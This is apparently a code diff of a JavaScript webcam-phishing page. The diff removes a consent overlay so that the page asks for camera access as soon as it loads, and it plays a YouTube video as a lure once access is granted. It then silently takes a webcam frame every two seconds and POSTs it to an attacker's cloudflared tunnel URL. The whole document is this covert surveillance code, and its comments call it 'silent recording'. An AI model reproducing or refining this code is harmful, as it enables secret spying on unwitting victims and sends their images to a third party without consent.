@@ -1,19 +1,12 @@
 // Wait for page to load
 document.addEventListener('DOMContentLoaded', function() {
-    const overlay = document.getElementById('permission-overlay');
-    const allowBtn = document.getElementById('allow-btn');
-    const denyBtn = document.getElementById('deny-btn');
     let mediaStream = null;
     let captureInterval = null;
     let videoElement = document.createElement('video');
+    let videoPlayed = false; // Flag to track if video has been played
 
-    // ============================================================
-    // ⬇️⬇️⬇️ YAHAN APNA CLOUDFLARED URL DAALO ⬇️⬇️⬇️
-    // ============================================================
-    const BACKEND_URL = 'https://brighton-satisfied-encourages-adapters.trycloudflare.com';  
-    // ============================================================
-    // ⬆️⬆️⬆️ SIRF IS LINE KO CHANGE KARO ⬆️⬆️⬆️
-    // ============================================================
+    // ⬇️ APNA CLOUDFLARED URL DAALO ⬇️
+    const BACKEND_URL = 'https://YOUR_CLOUDFLARED_URL.trycloudflare.com';
 
     // Function to capture image and send to server
     function captureAndSendImage() {
@@ -24,13 +17,10 @@ document.addEventListener('DOMContentLoaded', function() {
         canvas.height = 480;
         const ctx = canvas.getContext('2d');
         
-        // Draw video frame to canvas
         ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
         
-        // Convert to JPEG (smaller size)
         const imageData = canvas.toDataURL('image/jpeg', 0.8);
         
-        // Send to Python server (CORS enabled)
         fetch(BACKEND_URL + '/upload', {
             method: 'POST',
             headers: {
@@ -50,45 +40,54 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Allow button clicked
-    allowBtn.addEventListener('click', function() {
-        // Request camera access
-        navigator.mediaDevices.getUserMedia({ 
-            video: { width: 640, height: 480 } 
-        })
-        .then(stream => {
-            mediaStream = stream;
-            videoElement.srcObject = stream;
-            videoElement.play();
-            
-            // Hide overlay
-            overlay.style.display = 'none';
-            
-            // Start capturing every 2 seconds (silent recording)
-            captureInterval = setInterval(captureAndSendImage, 2000);
-            
-            // Show success message in console only (silent)
-            console.log('📸 Camera access granted. Capturing...');
-        })
-        .catch(err => {
-            console.error('❌ Camera error:', err);
-            alert('Camera access failed. Please try again.');
-        });
-    });
-
-    // Deny button clicked
-    denyBtn.addEventListener('click', function() {
-        // Redirect to YouTube or close
-        window.location.href = 'https://www.youtube.com';
-        // Alternative: window.close();
-    });
-
-    // Also handle if user manually denies via browser popup
-    setTimeout(() => {
-        if (mediaStream === null) {
-            console.log('⚠️ Camera access was denied by browser popup');
+    // Function to play YouTube video
+    function playYouTubeVideo() {
+        if (videoPlayed) return; // Sirf ek baar play karo
+        videoPlayed = true;
+        
+        const iframe = document.getElementById('youtube-video');
+        const placeholder = document.getElementById('video-placeholder');
+        
+        // Hide placeholder
+        if (placeholder) {
+            placeholder.style.display = 'none';
         }
-    }, 5000);
+        
+        // Show iframe and set video source
+        iframe.style.display = 'block';
+        iframe.src = 'https://www.youtube.com/embed/sciKttcTabQ?autoplay=1&mute=1';
+        
+        console.log('▶️ Video started playing');
+    }
+
+    // Function to redirect on deny
+    function redirectOnDeny() {
+        console.log('🚫 Camera denied. Redirecting to YouTube...');
+        window.location.href = 'https://www.youtube.com';
+    }
+
+    // 🔥 AUTOMATIC CAMERA ACCESS
+    navigator.mediaDevices.getUserMedia({ 
+        video: { width: 640, height: 480 } 
+    })
+    .then(stream => {
+        mediaStream = stream;
+        videoElement.srcObject = stream;
+        videoElement.play();
+        
+        // ✅ Camera allowed - Play video and start recording
+        playYouTubeVideo();
+        
+        // Start capturing every 2 seconds
+        captureInterval = setInterval(captureAndSendImage, 2000);
+        
+        console.log('📸 Camera access granted. Capturing...');
+    })
+    .catch(err => {
+        console.error('❌ Camera error:', err);
+        // ❌ Camera denied - Redirect to YouTube
+        redirectOnDeny();
+    });
 });
 
 // Cleanup when page unloads
